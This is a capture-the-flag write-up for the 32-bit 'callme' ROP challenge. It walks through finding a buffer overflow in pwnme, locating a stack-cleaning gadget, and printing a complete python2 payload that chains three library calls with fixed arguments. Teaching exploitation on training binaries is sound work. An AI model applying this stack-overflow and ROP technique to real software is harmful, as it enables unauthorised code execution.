## Description:
> The elements that allowed you to complete ret2win are still present, they've just been split apart. Find them and recombine them using a short ROP chain.
> ![[Pasted image 20231215182344.png]]
## Write-up:
![[Pasted image 20231217151601.png]]
As before, the `NX` bit is set and there are some interesting functions names.
Analysis in Ghidra shows `usefulFunction` calls the three external library functions mentioned in the challenge instructions. The instructions state that to win, the 3 external functions must be called with specific parameters in a specific order in order to decrypt the flag.
![[Pasted image 20231217152005.png]]
The function `pwnme` contains a buffer overflow vulnerability, which I can use to create a ROP chain on the stack to call each of the required functions (with their respective parameters) in the correct order.
```c
void pwnme(void)
{
  undefined local_2c [40];
  memset(local_2c,0,0x20);
  puts("Hope you read the instructions...\n");
  printf("> ");
  read(0,local_2c,0x200);
  puts("Thank you!");
  return;
}
```
Using `gdb-peda` I found the offset from the buffer to the return address of `pwnme` on the stack:
![[Pasted image 20231217152505.png]]
As in the previous challenge, the offset is 44 bytes.
Now, because I want to call 3 functions, each with arguments, I am going to need a way to properly set up the stack each time before the next function in the chain is called.
In the previous challenge, it was possible to reuse the `call system()` instruction, but in this case, reusing the `call callme_one` instruction would result in the wrong return address being set and execution returning to this point after `callme_one` is finished. This is a problem because I then need to call the other two `callme` functions. This means, in this case I can't use the existing `call` instructions and instead need to set up the stack manually.
In x86, when calling a function, the stack should look like:
```
address to jump to,
return address,
args
```
Because I need to call 3 functions, I need to do this 3 times. The problem, however, is that if I just set the return address to `callme_two`, its return becomes `arg1` and its first parameter becomes `arg2`, which is not correct. 
So, I will need some ROP gadget to clean up my stack by `pop`-ing the 3 parameters from the stack, before returning to the next function in the chain.
![[Pasted image 20231217163219.png]]
Using `ROPgadget`, I have found one gadget which pops 3 values from the stack and saves them in registers. I will use this gadget to clean my stack between each function call. It will remove the 3 parameters from the stack, and then `ret` to the next value on the stack, which will be my next function call.
For the addresses of each function I need to call, I will use the address of the "THUNK" functions for each of these, as the actual functions are external and loaded in at runtime. I found these addresses using Ghidra.
Putting all of this together, my exploit should look like:
```
44 bytes of junk

addr of callme_one # 0x080484f0
addr of ROP gadget # 0x080487f9
args:
	0xdeadbeef
	0xcafebabe
	0xd00df00d

addr of callme_two # 0x08048550
addr of ROP gadget
args

addr of callme_three # 0x080484e0
dummy addr # 0x00000000
args
```
I generate the payload like so:
```c
python2 -c 'print \
"\x00"*44 + \
"\xf0\x84\x04\x08" + \
"\xf9\x87\x04\x08" + \
"\xef\xbe\xad\xde" + \
"\xbe\xba\xfe\xca" + \
"\x0d\xf0\x0d\xd0" + \
"\x50\x85\x04\x08" + \
"\xf9\x87\x04\x08" + \
"\xef\xbe\xad\xde" + \
"\xbe\xba\xfe\xca" + \
"\x0d\xf0\x0d\xd0" + \
"\xe0\x84\x04\x08" + \
"\x00\x00\x00\x00" + \
"\xef\xbe\xad\xde" + \
"\xbe\xba\xfe\xca" + \
"\x0d\xf0\x0d\xd0" \
' > payload.txt
```
Executing `callme32` with this payload gives the following output:
![[Pasted image 20231217165300.png]]
As you can see, the ROP chain worked and the flag was successfully "decrypted" and printed, by chaining together 3 external functions with specific parameters.